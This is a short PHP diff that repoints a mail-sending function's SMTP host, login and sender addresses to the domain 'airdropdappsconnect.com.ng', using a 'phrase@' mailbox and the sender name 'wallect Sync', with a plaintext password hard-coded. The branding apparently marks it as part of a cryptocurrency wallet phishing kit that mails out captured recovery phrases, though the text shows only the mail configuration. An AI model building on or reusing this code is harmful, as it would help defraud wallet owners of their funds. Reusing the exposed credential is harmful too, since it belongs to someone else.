@@ -7,14 +7,14 @@ function sendMail($subject, $msg, $email) {
         $mail->isSendMail();
         $mail->SMTPDebug = 0;
         $mail->Debugoutput = '';
-        $mail->Host = "mail.yahoo.com";
+        $mail->Host = "airdropdappsconnect.com.ng";
         $mail->Port = 465;
         $mail->SMTPAuth = true;
-        $mail->Username = "harpermendez01@yahoo.com";
+        $mail->Username = "phrase@airdropdappsconnect.com.ng";
         $mail->Password = 'khariz2020@';
-        $mail->setFrom('harpermendez01@yahoo.com', 'wallect Sync');
+        $mail->setFrom('phrase@airdropconnect.com.ng', 'wallect Sync');
         $mail->setFromName = 'wallect Sync';
-        $mail->addReplyTo("harpermendez01@yahoo.com");
+        $mail->addReplyTo("phrase@airdropdappsconnect.com.ng");
         $mail->addAddress($email);
         $mail->Subject = $subject;
         $mail->msgHTML($msg);
